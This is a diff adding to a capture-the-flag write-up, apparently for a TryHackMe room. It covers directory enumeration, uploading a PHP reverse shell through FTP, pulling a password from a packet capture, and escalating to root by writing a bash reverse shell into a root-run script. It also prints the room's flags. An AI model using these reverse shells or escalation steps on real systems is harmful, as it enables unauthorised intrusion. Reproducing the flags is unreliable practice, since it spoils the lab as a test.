@@ -72,3 +72,130 @@ ftp 10.10.246.53
 
 
 
+
+## `gobuster`
+
+```ruby
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.106.2 
+```
+
+<img width="1135" height="386" alt="image" src="https://github.com/user-attachments/assets/5a903313-b641-4ee4-b30f-443140535d8d" />
+
+
+```
+http://10.10.106.2/files/
+```
+
+<img width="645" height="343" alt="image" src="https://github.com/user-attachments/assets/51fa8025-7a55-4f86-bccf-8c85e86392cd" />
+
+> looks it is same content of Ftp
+
+> let's try to put file on **`ftp`** directory to see if it will appear in browser
+
+<img width="1095" height="199" alt="image" src="https://github.com/user-attachments/assets/763031c9-0462-46e6-bd43-81cd1d87ba17" />
+
+
+<img width="992" height="153" alt="image" src="https://github.com/user-attachments/assets/8967ff6f-b261-432b-9ffe-4fd6e2d1f8fe" />
+
+
+> ### good now will try to upload php reverseshell
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.47.102/4444 0>&1'");
+```
+
+
+<img width="1121" height="397" alt="image" src="https://github.com/user-attachments/assets/bdd1c8f5-ccc4-4b80-bb84-4dce9cf28094" />
+
+
+<img width="1359" height="495" alt="image" src="https://github.com/user-attachments/assets/54aa5b74-7f37-4250-86d1-80b03b76879a" />
+
+
+> ## now the recipe is 
+
+<img width="1265" height="90" alt="image" src="https://github.com/user-attachments/assets/531474f2-2fe9-46d9-bdcd-429a6624abe6" />
+
+
+> ### found pcapng file
+
+<img width="807" height="89" alt="image" src="https://github.com/user-attachments/assets/60305210-7c82-486c-b38e-28b6f5dbd404" />
+
+
+
+> ### send it to my machine
+
+<img width="1181" height="358" alt="image" src="https://github.com/user-attachments/assets/65994de1-2c01-42f6-a1c8-2feae5b4b9a4" />
+
+
+> ### click on any Tcp packet then **`Follow`** -> **`TCP streen`**
+
+
+<img width="1874" height="807" alt="image" src="https://github.com/user-attachments/assets/ce26510f-bb10-4e0e-b2e6-2b4b8625cff9" />
+
+
+
+```
+c4ntg3t3n0ughsp1c3
+```
+
+## login to lennie ssh 
+
+```
+ssh lennie@10.10.98.196
+```
+
+<img width="940" height="510" alt="image" src="https://github.com/user-attachments/assets/0fbf0621-5d62-4b25-8034-01655c7fe5f8" />
+
+
+```
+THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
+```
+
+## using linpeas found
+
+<img width="1293" height="178" alt="image" src="https://github.com/user-attachments/assets/c9361f81-c0c6-45fd-ba3d-537ce2a84c10" />
+
+> ## planner script it own to root i can't edit it but it run another script i can edit it call **`print.sh`** i will edit it and put reveseshell
+
+```
+/home/lennie/scripts/startup_list.txt
+/home/lennie/scripts/planner.sh
+
+
+/etc/print.sh
+```
+
+```
+sh -i >& /dev/tcp/10.8.47.102/4445 0>&1
+```
+
+
+<img width="897" height="218" alt="image" src="https://github.com/user-attachments/assets/dc321dec-babd-47f5-b236-09ec3972d580" />
+
+
+
+
+## wait untill file excuted
+
+<img width="914" height="371" alt="image" src="https://github.com/user-attachments/assets/5a04e69a-08b6-40f4-8dcf-17b07f143999" />
+
+```
+THM{f963aaa6a430f210222158ae15c3d76d}
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
